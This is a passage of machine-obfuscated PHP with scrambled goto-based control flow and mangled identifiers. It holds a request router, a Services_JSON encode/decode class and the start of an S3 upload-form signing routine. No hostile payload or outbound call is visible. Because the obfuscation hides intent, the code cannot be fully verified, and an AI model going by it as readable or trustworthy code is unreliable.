array_slice($GLOBALS[$aĞ¾¥Ô¢ó[7]][$aĞ¾¥Ô¢ó[435]], 1); $GLOBALS[$aĞ¾¥Ô¢ó[7]][$aĞ¾¥Ô¢ó[435]] = array_merge($AÕÀ †ù®Æ, $A°éµñï—); goto dŒªä¶£†š; Bäöì‡åŠ: if (!$A°‡ÉœîÇ× || strlen($A°‡ÉœîÇ×) <= strlen($a†Ğƒà„œ‚)) { return; } if (strtolower(substr($A°‡ÉœîÇ×, -strlen($a†Ğƒà„œ‚))) != $a†Ğƒà„œ‚) { return; } $e‰‹‹½çË = substr($A°‡ÉœîÇ×, 0, -strlen($a†Ğƒà„œ‚)); goto CÌ©Ó‡‚È; dŒªä¶£†š: $GLOBALS[$aĞ¾¥Ô¢ó[7]][$aĞ¾¥Ô¢ó[436]] = implode($aĞ¾¥Ô¢ó[90], $GLOBALS[$aĞ¾¥Ô¢ó[7]][$aĞ¾¥Ô¢ó[435]]); goto CŠõÚ¬Ã­; CŠõÚ¬Ã­: } private function parseUriRoute() { goto F¤ƒµƒ ğ; F¤ƒµƒ ğ: $EØ·»ôÙ‰ =& $_SERVER[İåâé¾]; if ($GLOBALS[$EØ·»ôÙ‰[7]][$EØ·»ôÙ‰[436]] != $EØ·»ôÙ‰[33]) { return; } $a£ÎÚ°¡¾˜ = $_SERVER[$EØ·»ôÙ‰[437]]; goto Bò£×Î‡Ù; c·†Ìñƒµâ: $GLOBALS[$EØ·»ôÙ‰[7]][$EØ·»ôÙ‰[435]] = explode($EØ·»ôÙ‰[8], $aİ”«›÷ó); $GLOBALS[$EØ·»ôÙ‰[7]][$EØ·»ôÙ‰[436]] = implode($EØ·»ôÙ‰[90], $GLOBALS[$EØ·»ôÙ‰[7]][$EØ·»ôÙ‰[435]]); goto b»Œ£“­¥„; Bò£×Î‡Ù: $eõóÍö·ñ = $EØ·»ôÙ‰[438]; if (!strstr($a£ÎÚ°¡¾˜, $eõóÍö·ñ)) { return; } $d³º‰è…Û = strrpos($a£ÎÚ°¡¾˜, $eõóÍö·ñ); goto Fğ‘â´Œ½; Fğ‘â´Œ½: $aİ”«›÷ó = substr($a£ÎÚ°¡¾˜, $d³º‰è…Û + strlen($eõóÍö·ñ)); preg_match_all($EØ·»ôÙ‰[439], $aİ”«›÷ó, $eæ‰¡¶¯­Ü); $aİ”«›÷ó = trim($eæ‰¡¶¯­Ü[0][0], $EØ·»ôÙ‰[8]); goto c·†Ìñƒµâ; b»Œ£“­¥„: } public function run() { goto CÓÒº ò‚; Bğ‘Åš­ğ†: $f³°Ö¬Œì© = $GLOBALS[$e‚”Úƒ—Æ¾[7]][$e‚”Úƒ—Æ¾[435]]; $Eˆƒè† †‘ = $GLOBALS[$e‚”Úƒ—Æ¾[7]][$e‚”Úƒ—Æ¾[436]]; define($e‚”Úƒ—Æ¾[440], $f³°Ö¬Œì©[0] ? $f³°Ö¬Œì©[0] : $this->defaultModule); goto AµÂ°¥Éá­; AµÂ°¥Éá­: define($e‚”Úƒ—Æ¾[441], $f³°Ö¬Œì©[1] ? $f³°Ö¬Œì©[1] : $this->defaultController); define($e‚”Úƒ—Æ¾[442], $f³°Ö¬Œì©[2] ? $f³°Ö¬Œì©[2] : $this->defaultAction); define($e‚”Úƒ—Æ¾[443], MOD . $e‚”Úƒ—Æ¾[90] . ST . $e‚”Úƒ—Æ¾[90] . ACT); goto E«àŒÑÙ¡‡; E«àŒÑÙ¡‡: $this->autorun(); if (count($f³°Ö¬Œì©) >= 3) { $this->appRun($Eˆƒè† †‘); } else { $this->appRun(ACTION); } goto CéŞïÓÅ‡; CÓÒº ò‚: $e‚”Úƒ—Æ¾ =& $_SERVER[İåâé¾]; $this->parseUriRoute(); $this->parsePluginRoute(); goto Bğ‘Åš­ğ†; CéŞïÓÅ‡: } } goto EÄˆááùİ–; Cá¬Ô²¤²‡: define($_SERVER[İåâé¾][1330], 16); define($_SERVER[İåâé¾][1331], 32); class Services_JSON { function __construct($Fñ¢¢µ»“õ = 0) { $this->use = $Fñ¢¢µ»“õ; } function utf162utf8($C¥¡¶®—´È) { $aö’óÒ»¶† =& $_SERVER[İåâé¾]; if (function_exists($aö’óÒ»¶†[69])) { return mb_convert_encoding($C¥¡¶®—´È, $aö’óÒ»¶†[1332], $aö’óÒ»¶†[1333]); } $Ağ¡ˆä˜ = ord($C¥¡¶®—´È[0]) << 8 | ord($C¥¡¶®—´È[1]); switch (!0) { case (127 & $Ağ¡ˆä˜) == $Ağ¡ˆä˜: return chr(127 & $Ağ¡ˆä˜); case (2047 & $Ağ¡ˆä˜) == $Ağ¡ˆä˜: return chr(192 | $Ağ¡ˆä˜ >> 6 & 31) . chr(128 | $Ağ¡ˆä˜ & 63); case (65535 & $Ağ¡ˆä˜) == $Ağ¡ˆä˜: return chr(224 | $Ağ¡ˆä˜ >> 12 & 15) . chr(128 | $Ağ¡ˆä˜ >> 6 & 63) . chr(128 | $Ağ¡ˆä˜ & 63); } return $aö’óÒ»¶†[33]; } function utf82utf16($e¬ô±È°•Í) { $E¬ç‚Šá»¾ =& $_SERVER[İåâé¾]; if (function_exists($E¬ç‚Šá»¾[69])) { return mb_convert_encoding($e¬ô±È°•Í, $E¬ç‚Šá»¾[1333], $E¬ç‚Šá»¾[1332]); } switch (strlen($e¬ô±È°•Í)) { case 1: return $e¬ô±È°•Í; case 2: return chr(7 & ord($e¬ô±È°•Í[0]) >> 2) . chr(192 & ord($e¬ô±È°•Í[0]) << 6 | 63 & ord($e¬ô±È°•Í[1])); case 3: return chr(240 & ord($e¬ô±È°•Í[0]) << 4 | 15 & ord($e¬ô±È°•Í[1]) >> 2) . chr(192 & ord($e¬ô±È°•Í[1]) << 6 | 127 & ord($e¬ô±È°•Í[2])); } return $E¬ç‚Šá»¾[33]; } function encode($aá¢Ÿ‚Ë) { $EñÒ¨ˆÛ¶ö =& $_SERVER[İåâé¾]; switch (gettype($aá¢Ÿ‚Ë)) { case $EñÒ¨ˆÛ¶ö[1334]: return $aá¢Ÿ‚Ë ? $EñÒ¨ˆÛ¶ö[1335] : $EñÒ¨ˆÛ¶ö[1336]; case $EñÒ¨ˆÛ¶ö[1337]: return $EñÒ¨ˆÛ¶ö[98]; case $EñÒ¨ˆÛ¶ö[306]: return (int) $aá¢Ÿ‚Ë; case $EñÒ¨ˆÛ¶ö[281]: case $EñÒ¨ˆÛ¶ö[280]: return (double) $aá¢Ÿ‚Ë; case $EñÒ¨ˆÛ¶ö[315]: $cÌ¦ÀŸ„Îƒ = $EñÒ¨ˆÛ¶ö[33]; $C‘‹òØ¹¥õ = strlen($aá¢Ÿ‚Ë); for ($fæ÷•±×¼¶ = 0; $fæ÷•±×¼¶ < $C‘‹òØ¹¥õ; ++$fæ÷•±×¼¶) { $d¿ÌÒï‘ç = ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶]); switch (!0) { case $d¿ÌÒï‘ç == 8: $cÌ¦ÀŸ„Îƒ .= $EñÒ¨ˆÛ¶ö[1338]; break; case $d¿ÌÒï‘ç == 9: $cÌ¦ÀŸ„Îƒ .= $EñÒ¨ˆÛ¶ö[1339]; break; case $d¿ÌÒï‘ç == 10: $cÌ¦ÀŸ„Îƒ .= $EñÒ¨ˆÛ¶ö[1340]; break; case $d¿ÌÒï‘ç == 12: $cÌ¦ÀŸ„Îƒ .= $EñÒ¨ˆÛ¶ö[1341]; break; case $d¿ÌÒï‘ç == 13: $cÌ¦ÀŸ„Îƒ .= $EñÒ¨ˆÛ¶ö[1342]; break; case $d¿ÌÒï‘ç == 34: case $d¿ÌÒï‘ç == 47: case $d¿ÌÒï‘ç == 92: $cÌ¦ÀŸ„Îƒ .= $EñÒ¨ˆÛ¶ö[92] . $aá¢Ÿ‚Ë[$fæ÷•±×¼¶]; break; case $d¿ÌÒï‘ç >= 32 && $d¿ÌÒï‘ç <= 127: $cÌ¦ÀŸ„Îƒ .= $aá¢Ÿ‚Ë[$fæ÷•±×¼¶]; break; case ($d¿ÌÒï‘ç & 224) == 192: $b†ÜÊ¥„§™ = pack($EñÒ¨ˆÛ¶ö[1343], $d¿ÌÒï‘ç, ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 1])); $fæ÷•±×¼¶ += 1; $C„¶Œôí = $this->utf82utf16($b†ÜÊ¥„§™); $cÌ¦ÀŸ„Îƒ .= sprintf($EñÒ¨ˆÛ¶ö[1344], bin2hex($C„¶Œôí)); break; case ($d¿ÌÒï‘ç & 240) == 224: $b†ÜÊ¥„§™ = pack($EñÒ¨ˆÛ¶ö[1343], $d¿ÌÒï‘ç, ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 1]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 2])); $fæ÷•±×¼¶ += 2; $C„¶Œôí = $this->utf82utf16($b†ÜÊ¥„§™); $cÌ¦ÀŸ„Îƒ .= sprintf($EñÒ¨ˆÛ¶ö[1344], bin2hex($C„¶Œôí)); break; case ($d¿ÌÒï‘ç & 248) == 240: $b†ÜÊ¥„§™ = pack($EñÒ¨ˆÛ¶ö[1343], $d¿ÌÒï‘ç, ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 1]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 2]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 3])); $fæ÷•±×¼¶ += 3; $C„¶Œôí = $this->utf82utf16($b†ÜÊ¥„§™); $cÌ¦ÀŸ„Îƒ .= sprintf($EñÒ¨ˆÛ¶ö[1344], bin2hex($C„¶Œôí)); break; case ($d¿ÌÒï‘ç & 252) == 248: $b†ÜÊ¥„§™ = pack($EñÒ¨ˆÛ¶ö[1343], $d¿ÌÒï‘ç, ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 1]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 2]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 3]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 4])); $fæ÷•±×¼¶ += 4; $C„¶Œôí = $this->utf82utf16($b†ÜÊ¥„§™); $cÌ¦ÀŸ„Îƒ .= sprintf($EñÒ¨ˆÛ¶ö[1344], bin2hex($C„¶Œôí)); break; case ($d¿ÌÒï‘ç & 254) == 252: $b†ÜÊ¥„§™ = pack($EñÒ¨ˆÛ¶ö[1343], $d¿ÌÒï‘ç, ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 1]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 2]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 3]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 4]), ord($aá¢Ÿ‚Ë[$fæ÷•±×¼¶ + 5])); $fæ÷•±×¼¶ += 5; $C„¶Œôí = $this->utf82utf16($b†ÜÊ¥„§™); $cÌ¦ÀŸ„Îƒ .= sprintf($EñÒ¨ˆÛ¶ö[1344], bin2hex($C„¶Œôí)); break; } } return $EñÒ¨ˆÛ¶ö[111] . $cÌ¦ÀŸ„Îƒ . $EñÒ¨ˆÛ¶ö[111]; case $EñÒ¨ˆÛ¶ö[1345]: if (is_array($aá¢Ÿ‚Ë) && count($aá¢Ÿ‚Ë) && array_keys($aá¢Ÿ‚Ë) !== range(0, sizeof($aá¢Ÿ‚Ë) - 1)) { $fœÔ†ò¥„ó = array_map(array($this, $EñÒ¨ˆÛ¶ö[1346]), array_keys($aá¢Ÿ‚Ë), array_values($aá¢Ÿ‚Ë)); foreach ($fœÔ†ò¥„ó as $f¿›ñ½Ö°ñ) { if (Services_JSON::isError($f¿›ñ½Ö°ñ)) { return $f¿›ñ½Ö°ñ; } } return $EñÒ¨ˆÛ¶ö[813] . join($EñÒ¨ˆÛ¶ö[47], $fœÔ†ò¥„ó) . $EñÒ¨ˆÛ¶ö[318]; } $bÌŞˆƒôŠÑ = array_map(array($this, $EñÒ¨ˆÛ¶ö[1347]), $aá¢Ÿ‚Ë); foreach ($bÌŞˆƒôŠÑ as $B—Ú‰Ã‰Ø) { if (Services_JSON::isError($B—Ú‰Ã‰Ø)) { return $B—Ú‰Ã‰Ø; } } return $EñÒ¨ˆÛ¶ö[153] . join($EñÒ¨ˆÛ¶ö[47], $bÌŞˆƒôŠÑ) . $EñÒ¨ˆÛ¶ö[1348]; case $EñÒ¨ˆÛ¶ö[1349]: $e¢¹Ö‡–† = get_object_vars($aá¢Ÿ‚Ë); $fœÔ†ò¥„ó = array_map(array($this, $EñÒ¨ˆÛ¶ö[1346]), array_keys($e¢¹Ö‡–†), array_values($e¢¹Ö‡–†)); foreach ($fœÔ†ò¥„ó as $f¿›ñ½Ö°ñ) { if (Services_JSON::isError($f¿›ñ½Ö°ñ)) { return $f¿›ñ½Ö°ñ; } } return $EñÒ¨ˆÛ¶ö[813] . join($EñÒ¨ˆÛ¶ö[47], $fœÔ†ò¥„ó) . $EñÒ¨ˆÛ¶ö[318]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $EñÒ¨ˆÛ¶ö[98] : new Services_JSON_Error(gettype($aá¢Ÿ‚Ë) . $EñÒ¨ˆÛ¶ö[1350]); } } function name_value($F’ä¾İ”÷Â, $DùÉ…¯ÄâÍ) { $b”Ö£ñâæª = $this->encode($DùÉ…¯ÄâÍ); if (Services_JSON::isError($b”Ö£ñâæª)) { return $b”Ö£ñâæª; } return $this->encode(strval($F’ä¾İ”÷Â)) . $_SERVER[İåâé¾][4] . $b”Ö£ñâæª; } function reduce_string($E·ØËÂ¤Ê) { $C­‘Ú³âÅ =& $_SERVER[İåâé¾]; $E·ØËÂ¤Ê = preg_replace(array($C­‘Ú³âÅ[1351], $C­‘Ú³âÅ[1352], $C­‘Ú³âÅ[1353]), $C­‘Ú³âÅ[33], $E·ØËÂ¤Ê); return trim($E·ØËÂ¤Ê); } function decode($A°‚ ¬’Ô) { $eõˆóÉÊ‚ =& $_SERVER[İåâé¾]; $A°‚ ¬’Ô = $this->reduce_string($A°‚ ¬’Ô); switch (strtolower($A°‚ ¬’Ô)) { case $eõˆóÉÊ‚[1335]: return !0; case $eõˆóÉÊ‚[1336]: return !1; case $eõˆóÉÊ‚[98]: return null; default: $b®©Ãá¶¥” = array(); if (is_numeric($A°‚ ¬’Ô)) { return (double) $A°‚ ¬’Ô == (int) $A°‚ ¬’Ô ? (int) $A°‚ ¬’Ô : (double) $A°‚ ¬’Ô; } elseif (preg_match($eõˆóÉÊ‚[1354], $A°‚ ¬’Ô, $b®©Ãá¶¥”) && $b®©Ãá¶¥”[1] == $b®©Ãá¶¥”[2]) { $b‚åä™ùïÊ = substr($A°‚ ¬’Ô, 0, 1); $bÇíŠÓ¨²Å = substr($A°‚ ¬’Ô, 1, -1); $b´»„—Œ¤ô = $eõˆóÉÊ‚[33]; $c£–ğ¼õ° = strlen($bÇíŠÓ¨²Å); for ($aÔ—ùÈŸÇê = 0; $aÔ—ùÈŸÇê < $c£–ğ¼õ°; ++$aÔ—ùÈŸÇê) { $EœÛªè…½  = substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 2); $F‡§Æ•£æì = ord($bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê]); switch (!0) { case $EœÛªè…½  == $eõˆóÉÊ‚[1338]: $b´»„—Œ¤ô .= chr(8); ++$aÔ—ùÈŸÇê; break; case $EœÛªè…½  == $eõˆóÉÊ‚[1339]: $b´»„—Œ¤ô .= chr(9); ++$aÔ—ùÈŸÇê; break; case $EœÛªè…½  == $eõˆóÉÊ‚[1340]: $b´»„—Œ¤ô .= chr(10); ++$aÔ—ùÈŸÇê; break; case $EœÛªè…½  == $eõˆóÉÊ‚[1341]: $b´»„—Œ¤ô .= chr(12); ++$aÔ—ùÈŸÇê; break; case $EœÛªè…½  == $eõˆóÉÊ‚[1342]: $b´»„—Œ¤ô .= chr(13); ++$aÔ—ùÈŸÇê; break; case $EœÛªè…½  == $eõˆóÉÊ‚[1008]: case $EœÛªè…½  == $eõˆóÉÊ‚[1355]: case $EœÛªè…½  == $eõˆóÉÊ‚[1356]: case $EœÛªè…½  == $eõˆóÉÊ‚[1357]: if ($b‚åä™ùïÊ == $eõˆóÉÊ‚[111] && $EœÛªè…½  != $eõˆóÉÊ‚[1355] || $b‚åä™ùïÊ == $eõˆóÉÊ‚[55] && $EœÛªè…½  != $eõˆóÉÊ‚[1008]) { $b´»„—Œ¤ô .= $bÇíŠÓ¨²Å[++$aÔ—ùÈŸÇê]; } break; case preg_match($eõˆóÉÊ‚[1358], substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 6)): $aò¼‹³­Õç = chr(hexdec(substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê + 2, 2))) . chr(hexdec(substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê + 4, 2))); $b´»„—Œ¤ô .= $this->utf162utf8($aò¼‹³­Õç); $aÔ—ùÈŸÇê += 5; break; case $F‡§Æ•£æì >= 32 && $F‡§Æ•£æì <= 127: $b´»„—Œ¤ô .= $bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê]; break; case ($F‡§Æ•£æì & 224) == 192: $b´»„—Œ¤ô .= substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 2); ++$aÔ—ùÈŸÇê; break; case ($F‡§Æ•£æì & 240) == 224: $b´»„—Œ¤ô .= substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 3); $aÔ—ùÈŸÇê += 2; break; case ($F‡§Æ•£æì & 248) == 240: $b´»„—Œ¤ô .= substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 4); $aÔ—ùÈŸÇê += 3; break; case ($F‡§Æ•£æì & 252) == 248: $b´»„—Œ¤ô .= substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 5); $aÔ—ùÈŸÇê += 4; break; case ($F‡§Æ•£æì & 254) == 252: $b´»„—Œ¤ô .= substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 6); $aÔ—ùÈŸÇê += 5; break; } } return $b´»„—Œ¤ô; } elseif (preg_match($eõˆóÉÊ‚[1359], $A°‚ ¬’Ô) || preg_match($eõˆóÉÊ‚[1360], $A°‚ ¬’Ô)) { goto aé¢¢½Öƒß; eãêĞ™Ë¶È: for ($aÔ—ùÈŸÇê = 0; $aÔ—ùÈŸÇê <= $c£–ğ¼õ°; ++$aÔ—ùÈŸÇê) { $C•ô¬Á²ÂŸ = end($D°²ÊÆˆ‰ù); $EœÛªè…½  = substr($bÇíŠÓ¨²Å, $aÔ—ùÈŸÇê, 2); if ($aÔ—ùÈŸÇê == $c£–ğ¼õ° || $bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $eõˆóÉÊ‚[47] && $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]] == SERVICES_JSON_SLICE) { $cïÏì®Ç½ß = substr($bÇíŠÓ¨²Å, $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[266]], $aÔ—ùÈŸÇê - $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[266]]); array_push($D°²ÊÆˆ‰ù, array($eõˆóÉÊ‚[1361] => SERVICES_JSON_SLICE, $eõˆóÉÊ‚[266] => $aÔ—ùÈŸÇê + 1, $eõˆóÉÊ‚[1362] => !1)); if (reset($D°²ÊÆˆ‰ù) == SERVICES_JSON_IN_ARR) { array_push($aŸÁ‚ ¹Ñ…, $this->decode($cïÏì®Ç½ß)); } elseif (reset($D°²ÊÆˆ‰ù) == SERVICES_JSON_IN_OBJ) { $A…ñÜƒ¿Õ = array(); if (preg_match($eõˆóÉÊ‚[1363], $cïÏì®Ç½ß, $A…ñÜƒ¿Õ)) { $AÊª¨ÄğÈ = $this->decode($A…ñÜƒ¿Õ[1]); $a¬†š†åëÏ = $this->decode($A…ñÜƒ¿Õ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $BŒóÈ‘‘Û[$AÊª¨ÄğÈ] = $a¬†š†åëÏ; } else { $BŒóÈ‘‘Û->{$AÊª¨ÄğÈ} = $a¬†š†åëÏ; } } elseif (preg_match($eõˆóÉÊ‚[1364], $cïÏì®Ç½ß, $A…ñÜƒ¿Õ)) { $AÊª¨ÄğÈ = $A…ñÜƒ¿Õ[1]; $a¬†š†åëÏ = $this->decode($A…ñÜƒ¿Õ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $BŒóÈ‘‘Û[$AÊª¨ÄğÈ] = $a¬†š†åëÏ; } else { $BŒóÈ‘‘Û->{$AÊª¨ÄğÈ} = $a¬†š†åëÏ; } } } } elseif (($bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $eõˆóÉÊ‚[111] || $bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $eõˆóÉÊ‚[55]) && $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]] != SERVICES_JSON_IN_STR) { array_push($D°²ÊÆˆ‰ù, array($eõˆóÉÊ‚[1361] => SERVICES_JSON_IN_STR, $eõˆóÉÊ‚[266] => $aÔ—ùÈŸÇê, $eõˆóÉÊ‚[1362] => $bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê])); } elseif ($bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1362]] && $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]] == SERVICES_JSON_IN_STR && (strlen(substr($bÇíŠÓ¨²Å, 0, $aÔ—ùÈŸÇê)) - strlen(rtrim(substr($bÇíŠÓ¨²Å, 0, $aÔ—ùÈŸÇê), $eõˆóÉÊ‚[92]))) % 2 != 1) { array_pop($D°²ÊÆˆ‰ù); } elseif ($bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $eõˆóÉÊ‚[153] && in_array($C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($D°²ÊÆˆ‰ù, array($eõˆóÉÊ‚[1361] => SERVICES_JSON_IN_ARR, $eõˆóÉÊ‚[266] => $aÔ—ùÈŸÇê, $eõˆóÉÊ‚[1362] => !1)); } elseif ($bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $eõˆóÉÊ‚[1348] && $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]] == SERVICES_JSON_IN_ARR) { array_pop($D°²ÊÆˆ‰ù); } elseif ($bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $eõˆóÉÊ‚[813] && in_array($C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($D°²ÊÆˆ‰ù, array($eõˆóÉÊ‚[1361] => SERVICES_JSON_IN_OBJ, $eõˆóÉÊ‚[266] => $aÔ—ùÈŸÇê, $eõˆóÉÊ‚[1362] => !1)); } elseif ($bÇíŠÓ¨²Å[$aÔ—ùÈŸÇê] == $eõˆóÉÊ‚[318] && $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]] == SERVICES_JSON_IN_OBJ) { array_pop($D°²ÊÆˆ‰ù); } elseif ($EœÛªè…½  == $eõˆóÉÊ‚[1365] && in_array($C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($D°²ÊÆˆ‰ù, array($eõˆóÉÊ‚[1361] => SERVICES_JSON_IN_CMT, $eõˆóÉÊ‚[266] => $aÔ—ùÈŸÇê, $eõˆóÉÊ‚[1362] => !1)); $aÔ—ùÈŸÇê++; } elseif ($EœÛªè…½  == $eõˆóÉÊ‚[1366] && $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[1361]] == SERVICES_JSON_IN_CMT) { array_pop($D°²ÊÆˆ‰ù); $aÔ—ùÈŸÇê++; for ($c‡è¾‹¾ = $C•ô¬Á²ÂŸ[$eõˆóÉÊ‚[266]]; $c‡è¾‹¾ <= $aÔ—ùÈŸÇê; ++$c‡è¾‹¾) { $bÇíŠÓ¨²Å = substr_replace($bÇíŠÓ¨²Å, $eõˆóÉÊ‚[50], $c‡è¾‹¾, 1); } } } if (reset($D°²ÊÆˆ‰ù) == SERVICES_JSON_IN_ARR) { return $aŸÁ‚ ¹Ñ…; } elseif (reset($D°²ÊÆˆ‰ù) == SERVICES_JSON_IN_OBJ) { return $BŒóÈ‘‘Û; } goto Döïæ¿÷£›; BÀ‡×²Îœ: $bÇíŠÓ¨²Å = $this->reduce_string($bÇíŠÓ¨²Å); if ($bÇíŠÓ¨²Å == $eõˆóÉÊ‚[33]) { if (reset($D°²ÊÆˆ‰ù) == SERVICES_JSON_IN_ARR) { return $aŸÁ‚ ¹Ñ…; } else { return $BŒóÈ‘‘Û; } } $c£–ğ¼õ° = strlen($bÇíŠÓ¨²Å); goto eãêĞ™Ë¶È; aé¢¢½Öƒß: if ($A°‚ ¬’Ô[0] == $eõˆóÉÊ‚[153]) { $D°²ÊÆˆ‰ù = array(SERVICES_JSON_IN_ARR); $aŸÁ‚ ¹Ñ… = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $D°²ÊÆˆ‰ù = array(SERVICES_JSON_IN_OBJ); $BŒóÈ‘‘Û = array(); } else { $D°²ÊÆˆ‰ù = array(SERVICES_JSON_IN_OBJ); $BŒóÈ‘‘Û = new stdClass(); } } array_push($D°²ÊÆˆ‰ù, array($eõˆóÉÊ‚[1361] => SERVICES_JSON_SLICE, $eõˆóÉÊ‚[266] => 0, $eõˆóÉÊ‚[1362] => !1)); $bÇíŠÓ¨²Å = substr($A°‚ ¬’Ô, 1, -1); goto BÀ‡×²Îœ; Döïæ¿÷£›: } } } function isError($cíÛö±ùÎ—, $D¢ï¿ÍÎêê = null) { $BÊ·ïÒ§ØÓ =& $_SERVER[İåâé¾]; if (class_exists($BÊ·ïÒ§ØÓ[1367])) { return PEAR::isError($cíÛö±ùÎ—, $D¢ï¿ÍÎêê); } elseif (is_object($cíÛö±ùÎ—) && (get_class($cíÛö±ùÎ—) == $BÊ·ïÒ§ØÓ[1368] || is_subclass_of($cíÛö±ùÎ—, $BÊ·ïÒ§ØÓ[1368]))) { return !0; } return !1; } } goto CğËçµï¬Ù; A¥ƒ¾ê¨óå: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bĞï’Ë…‡è) { parent::__construct($bĞï’Ë…‡è); } public function uploadFormData($bİÕ‘ÌŞ˜Ì, $Bù‰‹›ğÒ™ = 3600) { goto a¯¬…ƒÒ; D™¾İóÈÛ«: $aŒÒ¬ó•Èæ = base64_encode(json_encode($d‰ãî–Šç²)); $a“Ó×‡Ù´† = hash_hmac($CáæŒ˜ã[875], $d£‡¬Ú“Õ¯, $CáæŒ˜ã[876] . $this->secret, !0); $bº¼‹ˆáÀÃ = hash_hmac($CáæŒ˜ã[875], $this->region, $a“Ó×‡Ù´†, !0); goto E˜‰ŠÄñ›‘; Aİç±—Éõ: $bÚ±äö´ë§ = $CáæŒ˜ã[867]; $b”è÷™‡á¯ = $Bù‰‹›ğÒ™ . $CáæŒ˜ã[33]; $Dš¯šåÎ‰· = $CáæŒ˜ã[835]; goto Bºí×Ì‘“; Bºí×Ì‘“: $AñƒğéÓò = array($this->accessKey, $d£‡¬Ú“Õ¯, $this->region, $a¶İ¡Ç§¹ˆ, $bÚ±äö´ë§); $bŞ·ğ¹˜¬À = implode($CáæŒ˜ã[8], $AñƒğéÓò); $d‰ãî–Šç² = array($CáæŒ˜ã[837] => gmdate($CáæŒ˜ã[836], strtotime($CáæŒ˜ã[868])), $CáæŒ˜ã[838] => array(array($CáæŒ˜ã[840] => $this->bucket), array($CáæŒ˜ã[839] => $B°áá»ñòØ), array($CáæŒ˜ã[841], $CáæŒ˜ã[842], $CáæŒ˜ã[33]), array($CáæŒ˜ã[841], $CáæŒ˜ã[869], $CáæŒ˜ã[33]), array($CáæŒ˜ã[841], $CáæŒ˜ã[870], $CáæŒ˜ã[33]), array($CáæŒ˜ã[843] => $Dš¯šåÎ‰·), array($CáæŒ˜ã[871] => $bŞ·ğ¹˜¬À), array($CáæŒ˜ã[872] => $EİÀÎâƒ³Õ), array($CáæŒ˜ã[873] => $c·‰¢¦óÔª), array($CáæŒ˜ã[874] => $b”è÷™‡á¯))); goto D™¾İóÈÛ«; FÚß”¢‘èŠ: $a¶İ¡Ç§¹ˆ = $CáæŒ˜ã[59]; $c·‰¢¦óÔª = gmdate($CáæŒ˜ã[866]); $d£‡¬Ú“Õ¯ = gmdate($CáæŒ˜ã[447]); goto Aİç±—Éõ; fÚ„†¬Ô·¾: $Bæ£Œ¯¼™… = array($CáæŒ˜ã[198] => $CáæŒ˜ã[33], $CáæŒ˜ã[877] => $CáæŒ˜ã[33], $CáæŒ˜ã[839] => $B°áá»ñòØ, $CáæŒ˜ã[843] => $Dš¯šåÎ‰·, $CáæŒ˜ã[847] => $aŒÒ¬ó•Èæ, $CáæŒ˜ã[878] => $bŞ·ğ¹˜¬À, $CáæŒ˜ã[879] => $EİÀÎâƒ³Õ, $CáæŒ˜ã[880] => $c·‰¢¦óÔª, $CáæŒ˜ã[881] => $b”è÷™‡á¯, $CáæŒ˜ã[882] => $A«­©ÊÑŠ¾, $CáæŒ˜ã[165] => $this->getHost()); return $Bæ£Œ¯¼™…; goto FÛ¹ÇåØ¨¦; E˜‰ŠÄñ›‘: $cƒÑ’à· = hash_hmac($CáæŒ˜ã[875], $a¶İ¡Ç§¹ˆ, $bº¼‹ˆáÀÃ, !0); 